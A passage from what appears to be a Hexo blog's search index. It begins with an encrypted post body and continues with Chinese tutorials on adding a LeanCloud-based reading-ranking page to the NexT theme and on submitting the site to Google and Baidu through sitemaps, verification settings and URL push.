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]]></content>
      <categories>
        <category>RF</category>
        <category>模拟电路</category>
      </categories>
      <tags>
        <tag>模拟电路</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Hexo-NexT新增阅读排行页面]]></title>
    <url>%2Farchives%2Fbaf1ffd.html</url>
    <content type="text"><![CDATA[本文基于 leancloud 的数据实现了一个阅读排行页面。新建页面hexo n page top 新建页面，会生成 top 目录，编辑其中自动生成的 index.md 文件，将其中的代码替换如下：123456789101112131415161718192021222324&lt;div id="top"&gt;&lt;/div&gt;&lt;script src="https://cdn1.lncld.net/static/js/av-core-mini-0.6.4.js"&gt;&lt;/script&gt;&lt;script&gt;AV.initialize("leancloud_appid", "leancloud_appkey");&lt;/script&gt;&lt;script type="text/javascript"&gt; var time=0 var title="" var url="" var query = new AV.Query('Counter'); query.notEqualTo('id',0); query.descending('time'); query.limit(1000); query.find().then(function (todo) &#123; for (var i=0;i&lt;1000;i++)&#123; var result=todo[i].attributes; time=result.time; title=result.title; url=result.url; var content="&lt;p&gt;"+"&lt;font color='#1C1C1C'&gt;"+"【文章热度:"+time+"℃】"+"&lt;/font&gt;"+"&lt;a href='"+"https://tding.top"+url+"'&gt;"+title+"&lt;/a&gt;"+"&lt;/p&gt;"; document.getElementById("top").innerHTML+=content &#125; &#125;, function (error) &#123; console.log("error"); &#125;);&lt;/script&gt;并将其中的 leancloud_appid、leancloud_appkey 和页面链接替换为你的。由于一些因素，我后面迁移到了Leancloud国际版，然后阅读排行榜就无法正常显示了，报出如下错误：1Failed to load resource: the server responded with a status of 403 () us.leancloud.cn/1.1/classes/Counter?redirectByAPI=cn:1最后发现，美国节点需要调用 AV.useAVCloudUS()，因此以上代码需要修改为：12345678910111213141516171819202122232425&lt;div id="top"&gt;&lt;/div&gt;&lt;script src="https://cdn1.lncld.net/static/js/av-core-mini-0.6.4.js"&gt;&lt;/script&gt;-&lt;script&gt;AV.initialize("leancloud_appid", "leancloud_appkey");&lt;/script&gt;+&lt;script&gt;AV.initialize("leancloud_appid", "leancloud_appkey");AV.useAVCloudUS();&lt;/script&gt;&lt;script type="text/javascript"&gt; var time=0 var title="" var url="" var query = new AV.Query('Counter'); query.notEqualTo('id',0); query.descending('time'); query.limit(1000); query.find().then(function (todo) &#123; for (var i=0;i&lt;1000;i++)&#123; var result=todo[i].attributes; time=result.time; title=result.title; url=result.url; var content="&lt;p&gt;"+"&lt;font color='#1C1C1C'&gt;"+"【文章热度:"+time+"℃】"+"&lt;/font&gt;"+"&lt;a href='"+"https://tding.top"+url+"'&gt;"+title+"&lt;/a&gt;"+"&lt;/p&gt;"; document.getElementById("top").innerHTML+=content &#125; &#125;, function (error) &#123; console.log("error"); &#125;);&lt;/script&gt;配置菜单显示编辑主题配置文件 themes\next_config.yml，添加 top：123menu: home: / || home top: /top/ || signal新增菜单栏的显示名称 hexo/theme/next/languages/zh-CN.yml，同样新增 top 对应的中文：123menu: home: 首页 top: 阅读排行参考hexo next 新增阅读排行页面WEB 安全域名设置后调用返回403 Forbidden 怎么破？]]></content>
      <categories>
        <category>工具使用</category>
        <category>Hexo</category>
      </categories>
      <tags>
        <tag>Hexo</tag>
        <tag>NexT</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Hexo-NexT博客提交搜索引擎收录]]></title>
    <url>%2Farchives%2F4ea54752.html</url>
    <content type="text"><![CDATA[如果你不主动提交你的博客地址给各大搜索引擎，那么即使你站内优化做得再好，搜索引擎根本都不知道你的博客的存在。本文简单介绍如何在各大搜索引擎提交博客。站点地图生成站点地图即sitemap，是一个页面，上面放置了网站上需要搜索引擎抓取的所有页面的链接。站点地图可以告诉搜索引擎网站上有哪些可供抓取的网页，以便搜索引擎可以更加智能地抓取网站。安装百度和Google的站点地图生成插件12npm install hexo-generator-baidu-sitemap --savenpm install hexo-generator-sitemap --save修改配置文件修改站点配置文件_config.yml，添加以下内容：12345# 自动生成sitemapsitemap: path: sitemap.xmlbaidusitemap: path: baidusitemap.xmlhexo g生成后进入public目录，你会发现里面有sitemap.xml和baidusitemap.xml两个文件，这就是生成的站点地图。里面包含了网站上所有页面的链接，搜索引擎通过这两个文件来抓取网站页面。sitemap.xml用来提交给Googlebaidusitemap.xml用来提交给百度Google Search Console查看是否被收录首先查看你的博客地址是否已经被Google收录，在Google的搜索栏中搜索：1site:https://tding.top搜索资源提交进入Google Web Master Search Console，首先需要进行站点验证，由于NexT-7.1.2已经内置了这个方法，所以这里只需要在主题配置文件_config.yml把验证代码写上去就可以：123# Google Webmaster tools verification.# See: https://www.google.com/webmastersgoogle_site_verification: smrzctX4--4QKjd_jAPttPxWy06c4SLQo2v1sHBA5rE然后提交sitemap即可。百度站长平台添加、验证站点由于NexT-7.1.2已经内置了这个方法，所以这里只需要在主题配置文件_config.yml把验证代码写上去就可以：123# Baidu Webmaster tools verification.# See: https://ziyuan.baidu.com/sitebaidu_site_verification: bfzCl5Q4EF生成、部署后进行验证即可。链接提交百度站长平台的链接提交方式分为自动提交和手动提交两种，此处只讲自动提交，手动提交按照要求操作即可。主动推送（实时）主动推送最为快速的提交方式，是被百度收录最快的推送方式。主动推送的实现原理如下：新链接的产生， hexo generate 会产生一个文本文件，里面包含最新的链接新链接的提交， hexo deploy 会从上述文件中读取链接，提交至百度搜索引擎下面是具体的实现：安装插件：1npm install hexo-baidu-url-submit --save然后在站点配置文件_config.yml添加：12345baidu_url_submit: count: 5 ## 提交最新的五个链接 host: tding.top ## 百度站长平台中注册的域名 token: xxxxxxxxxxx ## 